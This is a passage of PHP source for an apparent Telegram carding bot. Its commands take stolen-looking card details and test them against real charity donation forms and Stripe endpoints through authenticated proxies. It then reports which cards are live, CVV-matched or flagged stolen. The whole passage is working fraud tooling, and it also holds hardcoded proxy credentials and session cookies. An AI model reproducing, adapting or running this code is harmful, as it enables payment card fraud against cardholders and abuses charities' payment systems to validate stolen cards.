$proxyUsername = 'saha44424wnhl118659';

//The password for authenticating with the proxy.
$proxyPassword = 'b9Jm8kt8Cyit0dNw';

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxyIP);

//Set the port.
curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);

//Specify the username and password.
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUsername:$proxyPassword");
curl_setopt($ch, CURLOPT_URL, 'https://zionark.com.au/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="wpforms[fields][7]"

0.50
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="wpforms[fields][0][first]"

james
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="wpforms[fields][0][last]"

smith
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="wpforms[fields][8]"

'.$email.'
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="wpforms[stripe-credit-card-cardname]"

james smith
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="wpforms[id]"

6695
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="wpforms[author]"

2
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="wpforms[post_id]"

6677
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="wpforms[payment_method_id]"

'.$id.'
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="wpforms[token]"

e8d7ddc9686229645cd82dcad55bbfb0
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="action"

wpforms_submit
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="page_url"

https://zionark.com.au/donate/
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="page_title"

Donate
------WebKitFormBoundaryMpJZDYYX677IbBcN
Content-Disposition: form-data; name="page_id"

6677
------WebKitFormBoundaryMpJZDYYX677IbBcN--');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: zionark.com.au';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMpJZDYYX677IbBcN';
$headers[] = 'Cookie: _wpfuuid=052ed221-cc88-40fe-b1dc-a8389c0abce3; _gid=GA1.3.1213440247.1666186095; __stripe_mid=51b7b6e9-4cfd-4cf6-87cf-20ae41c0a0a47accd2; _ga_YLTXX8CTVB=GS1.1.1666254932.2.1.1666254937.0.0.0; _ga=GA1.1.947698589.1666186095; __stripe_sid=aa0ee625-5390-4ca5-a50b-67bf3bfeb134b4bb9e';
$headers[] = 'Origin: https://zionark.com.au';
$headers[] = 'Referer: https://zionark.com.au/donate/';
$headers[] = 'Sec-Ch-Ua: \"Chromium\";v=\"106\", \"Microsoft Edge\";v=\"106\", \"Not;A=Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36 Edg/106.0.1370.47';
$headers[] = 'X-Requested-With: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result2 = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);


///////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
    
curl_close($ch);


//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'success":true,"data"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CARD CHARGED✅ ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b> 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "requires_action")) || (strpos($result2, 'status": "requires_action'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ PROXY ERROR TRY AGAIN ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe $0.5 Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}


//==[Auth Command]==//

if ((strpos($message, "!auth") === 0)||(strpos($message, "/auth") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
    
    
//===[Randomizing Details]===//
    
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
    
//=[1st REQ]=//
    
$proxyIP = 'isp2.hydraproxy.com';

//The port that the proxy is listening on.
$proxyPort = '9989';
    
//The username for authenticating with the proxy.
$proxyUsername = 'john48925gpxv117692';
    
//The password for authenticating with the proxy.
$proxyPassword = 'H15IZRB0116B0tu4';
    
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxyIP);
    
//Set the port.
curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);
    
//Specify the username and password.
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUsername:$proxyPassword");
curl_setopt($ch, CURLOPT_URL, 'https://donational.org/get_setup_intent_client_secret');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: donational.org';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Length: 0';
$headers[] = 'Cookie: _donate-deliberately_session=vGvHDBmx%2BSHhX1AcA%2B%2Ffiy%2BHtgDirfgheYJ7aR99AJy8RErQsuCpCb0ko7rk8Vc5fONIMPHJL%2FA9LLrzR0GXtaVnHvxG6z%2BZ9%2Bwn1q3E1e1OaDLpKGYuaP1Cx4Yd4kNjlZikSPa5Qlq7%2FX0d3IQ2WOPp6VOKftKDjiEnH1rsmFEYhd4kCu2UBm0stv2efJcmYQY5XZIgCEGvBAvqQPVALjr5wn%2Fzrj3ClRnijrnbPH%2BvgVdH4RdhlBCT%2BHxKeZp7kS6De9liQTrQl%2Fb7cjJMpZ1mDtnSQ0bINtMTas%2BQ%2Fs0wqxZB--XE6m6Xl%2BvP39e9Xp--QL7tDXD27D5IEPXfC9HwIQ%3D%3D; ajs_anonymous_id=709f83b4-700c-4019-8f80-26ae6b8675fa; __stripe_mid=c547ffe5-8927-45bd-8f42-d7b453811ce0f90c89; __stripe_sid=fad740a9-7c08-43ca-9bfc-3d3a6e60405b8a6f97; mp_13e2f576e806113586fa70efcbf67ecd_mixpanel=%7B%22distinct_id%22%3A%20%22183e636941e565-07cdab069e5448-7b555476-15f900-183e636941f1fd%22%2C%22%24device_id%22%3A%20%22183e636941e565-07cdab069e5448-7b555476-15f900-183e636941f1fd%22%2C%22mp_lib%22%3A%20%22Segment%3A%20web%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; fs_uid=#59Q1P#6571529672822784:6285645299814400:::#/1697550680; fs_cid=1.0';
$headers[] = 'Origin: https://donational.org';
$headers[] = 'Referer: https://donational.org/oftw-queens';
$headers[] = 'Sec-Ch-Ua: \"Chromium\";v=\"106\", \"Microsoft Edge\";v=\"106\", \"Not;A=Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36 Edg/106.0.1370.47';
$headers[] = 'X-Csrf-Token: L9OHr7uzMi8rp2EV4zn-RMFgf_9SQ5F0Db8INleU8jdkOi4PD7PjKRa4zp6RpNhNbB7oEjItreRmYg-_vaUjJA';
$headers[] = 'X-Requested-With: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

 $result1 = curl_exec($ch);
 $short = trim(strip_tags(getStr($result1,'"client_secret":"','_secret')));
 $pi = trim(strip_tags(getStr($result1,'"client_secret":"','"')));
 curl_close($ch);
    
//=[2nd Req]=//
    
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$short.'/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "payment_method_data[type]=card&payment_method_data[billing_details][name]=Jake+Taylor&payment_method_data[billing_details][address][postal_code]=90002&payment_method_data[card][number]=$cc&payment_method_data[card][cvc]=$cvv&payment_method_data[card][exp_month]=$mes&payment_method_data[card][exp_year]=$ano&payment_method_data[guid]=f718d0cc-5489-4c2b-8c28-04d1b06fbed8349167&payment_method_data[muid]=c547ffe5-8927-45bd-8f42-d7b453811ce0f90c89&payment_method_data[sid]=fad740a9-7c08-43ca-9bfc-3d3a6e60405b8a6f97&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fa8b551343%3B+stripe-js-v3%2Fa8b551343&payment_method_data[time_on_page]=112705&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_prLGKEac9Gh1sk39qVk9ht36&client_secret=$pi");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Sec-Ch-Ua: \"Chromium\";v=\"106\", \"Microsoft Edge\";v=\"106\", \"Not;A=Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36 Edg/106.0.1370.47';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result2 = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);


///////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
//Set the proxy IP.
// curl_setopt($ch, CURLOPT_PROXY, $proxyIP);

//Set the port.
// curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);

//Specify the username and password.
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUsername:$proxyPassword");
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
    
curl_close($ch);
    
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ AUTH SUCCESS✅ ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b> 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "requires_action")) || (strpos($result2, 'status": "requires_action'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ PROXY ERROR TRY AGAIN ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe Auth</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}

//==[inr Command]==//

if ((strpos($message, "!inr") === 0)||(strpos($message, "/inr") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
